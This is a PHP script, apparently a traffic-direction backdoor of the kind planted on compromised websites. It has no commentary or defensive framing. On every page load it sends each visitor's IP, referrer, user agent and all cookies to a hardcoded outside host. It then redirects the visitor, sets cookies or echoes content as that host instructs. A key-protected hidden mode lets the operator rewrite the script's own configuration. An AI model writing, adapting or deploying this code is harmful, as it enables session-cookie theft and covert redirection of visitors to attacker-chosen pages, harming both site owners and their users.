<?$tds="http://las2.ru/777/TDS.post.php";$tdsip="";$lin="http://unicef.org";$esdid="1";$key="FDSSFG54tg3DFSTyt45t";?><?//BREACK//?>
<?php
//ConfGui
error_reporting(0);
$mode=$_GET["mode"];if($mode=="config" AND $key==$_GET['key']){
echo '<form name="form1" method="post" action=http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'?mode=setconfig&key='.$_GET['key'].'>
<table border="0"><tr><td>TDS</td><td><input type="text" name="ptds" value="'.$tds.'"></td><td>TDS IP</td>
<td><input type="text" name="ptdsip" value="'.$tdsip.'"></td><td>KEY</td><td><input type="text" name="pkey" value="'.$key.'"></td>
</tr><tr><td>Reserve</td><td><input type="text" name="pto" value="'.$lin.'"></td><td>ESD ID</td><td><input type="text" name="pesdid" value="'.$esdid.'"></td>
<td colspan="2"><input type="submit" name="Submit" value="ok"></td></tr></table></form>';die();}if($mode=="setconfig" AND $key==$_GET['key']){
$sn=explode("/", $_SERVER['SCRIPT_NAME']);foreach($sn as $snn){$scr=$snn;}
	$getlpa=file($scr);
	$strng=$getlpa[0];
$file=file($scr); 
for($i=0;$i<sizeof($file);$i++)
if($i==0) {
$ka='<?//BRE';$kaka=$ka.'ACK//?>';
$felp = explode($kaka, $file[$i]);
$file[$i]='<?$tds="'.$_POST["ptds"].'";$tdsip="'.$_POST["ptdsip"].'";$lin="'.$_POST["pto"].'";$esdid="'.$_POST["pesdid"].'";$key="'.$_POST["pkey"].'";?>'.$kaka.$felp[1];
}
$fp=fopen($scr,"w"); 
fputs($fp,implode("",$file)); 
fclose($fp);
}
//send
if(empty($tdsip)){$dom = explode("/", $tds);$dom=$dom[2];}else{$dom=$tdsip;}
$fp = fsockopen($dom, 80, $errno, $errstr, 2);
if (!$fp) {$goto=$lin;} else {
$t_dom=urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
$t_ref=urlencode($_SERVER[HTTP_REFERER]);
$t_ip=urlencode($_SERVER["REMOTE_ADDR"]);
$t_prox='no';if($_SERVER["HTTP_X_FORWARDED_FOR"]){$t_prox='yes';}
$t_agent=urlencode($_SERVER['HTTP_USER_AGENT']);
foreach($_COOKIE as $key=>$val) {$t_cookie=$t_cookie."&".$key."=".$val;}$t_cookie=urlencode($t_cookie);
if(empty($t_cookie)){$t_cookie=urlencode($_SERVER['QUERY_STRING']);}
    $out = "GET ".$tds."?dom=".$t_dom."&ref=".$t_ref."&ip=".$t_ip."&prox=".$t_prox."&agent=".$t_agent."&cookie=".$t_cookie."&esdid=".$esdid." HTTP/1.0\r\n";
    $out .= "Host: ".$dom."\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out);	
while (!feof($fp)) {$str=fgets($fp,128);if ($str=="\r\n" && empty($he)){$he = 'do';}if ($he=='do'){$goto.=$str;}}fclose ($fp);}$goto=substr($goto, 2);	
	$gotoe = explode("://", $goto);
	If($gotoe[0]=='http'){header('HTTP/1.1 302 Found');header('Location: '.$goto);}
If($gotoe[0]=='cook'){$gotoee=explode("&", $gotoe[1]);foreach($gotoee as $setcook){$set=explode("=", $setcook);setcookie($set[0], $set[1]);}}
If($gotoe[0]=='echo'){echo $gotoe[1];}
?>